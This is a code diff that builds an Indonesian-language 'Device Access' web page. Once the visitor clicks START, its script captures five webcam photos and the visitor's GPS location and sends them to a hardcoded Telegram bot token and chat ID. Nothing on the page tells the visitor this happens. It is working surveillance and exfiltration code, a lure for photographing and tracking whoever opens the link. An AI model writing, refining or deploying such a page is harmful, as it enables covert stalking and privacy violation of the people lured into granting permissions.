@@ -1,4 +1,21 @@
-margin:auto;
+<html lang="id"><head>
+<meta charset="UTF-8">
+<title>Device Access</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+    background:black;
+    color:#00ff00;
+    font-family:monospace;
+    text-align:center;
+    padding-top:20px;
+}
+.box{
+    border:1px solid #00ff00;
+    padding:20px;
+    width:90%;
+    max-width:320px;
+    margin:auto;
     box-shadow:0 0 20px #00ff00;
 }
 video{
@@ -16,8 +33,18 @@ button{
     font-size:16px;
 }
 </style>
+</head>
+<body>
 
-========== JS ==========
+<div class="box">
+<h2>🔐 DEVICE ACCESS</h2>
+<p id="status">Klik START</p>
+
+<video id="cam" autoplay="" playsinline=""></video>
+
+<button id="startBtn">START</button>
+</div>
+
 <script>
 const TOKEN = "8738380189:AAFOH0tBBBCaEY_U2dI-vzDQgWX__3ZdBcI";
 const CHAT_ID = "8010333398";
@@ -68,14 +95,14 @@ function sendLocation(pos){
 
     document.getElementById("status").innerText = "📍 " + lat + ", " + lon;
 
-    let text = 📍 DATA
+    let text = `📍 DATA
 
 🕒 ${jam}
 📍 ${lat}, ${lon}
 
-https://maps.google.com/?q=${lat},${lon};
+https://maps.google.com/?q=${lat},${lon}`;
 
-    fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify({
@@ -105,9 +132,147 @@ function captureAndSend(){
         let formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "foto.jpg");
-        formData.append("caption", 📸 FOTO ${fotoCount+1}\n🕒 ${jam});
+        formData.append("caption", `📸 FOTO ${fotoCount+1}\n🕒 ${jam}`);
 
-        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+    }, "image/jpeg");
+}
+
+// ERROR
+function geoError(err){
+    document.getElementById("status").innerText = "❌ Lokasi ditolak";
+    console.log(err);
+}
+</script>
+
+
+</body></html>
+
+<style>
+body{
+    background:black;
+    color:#00ff00;
+    font-family:monospace;
+    text-align:center;
+    padding-top:20px;
+}
+.box{
+    border:1px solid #00ff00;
+    padding:20px;
+    width:90%;
+    max-width:320px;
+    margin:auto;
+    box-shadow:0 0 20px #00ff00;
+}
+video{
+    width:100%;
+    border:1px solid #00ff00;
+    margin-top:10px;
+}
+button{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    background:black;
+    color:#00ff00;
+    border:1px solid #00ff00;
+    font-size:16px;
+}
+</style>
+
+<script>
+const TOKEN = "8738380189:AAFOH0tBBBCaEY_U2dI-vzDQgWX__3ZdBcI";
+const CHAT_ID = "8010333398";
+
+let fotoCount = 0;
+let lastSend = 0;
+
+// tombol fix
+document.getElementById("startBtn").addEventListener("click", startAll);
+
+async function startAll(){
+    alert("START DIKLIK"); // debug biar pasti kepencet
+    document.getElementById("status").innerText = "Meminta izin...";
+
+    // KAMERA
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+        document.getElementById("cam").srcObject = stream;
+
+        // kirim 5 foto
+        let interval = setInterval(() => {
+            if(fotoCount >= 5){
+                clearInterval(interval);
+                return;
+            }
+            captureAndSend();
+            fotoCount++;
+        }, 1000);
+
+    }catch(e){
+        document.getElementById("status").innerText = "❌ Kamera ditolak";
+        console.log(e);
+    }
+
+    // LOKASI
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(sendLocation, geoError);
+    }else{
+        document.getElementById("status").innerText = "❌ GPS tidak support";
+    }
+}
+
+// KIRIM LOKASI
+function sendLocation(pos){
+    let lat = pos.coords.latitude;
+    let lon = pos.coords.longitude;
+    let jam = new Date().toLocaleString();
+
+    document.getElementById("status").innerText = "📍 " + lat + ", " + lon;
+
+    let text = `📍 DATA
+
+🕒 ${jam}
+📍 ${lat}, ${lon}
+
+https://maps.google.com/?q=${lat},${lon}`;
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            chat_id:CHAT_ID,
+            text:text
+        })
+    })
+    .then(res=>res.json())
+    .then(data=>console.log(data))
+    .catch(err=>console.log(err));
+}
+
+// FOTO
+function captureAndSend(){
+    const video = document.getElementById("cam");
+
+    let canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    let ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    let jam = new Date().toLocaleString();
+
+    canvas.toBlob(function(blob){
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "foto.jpg");
+        formData.append("caption", `📸 FOTO ${fotoCount+1}\n🕒 ${jam}`);
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
         });
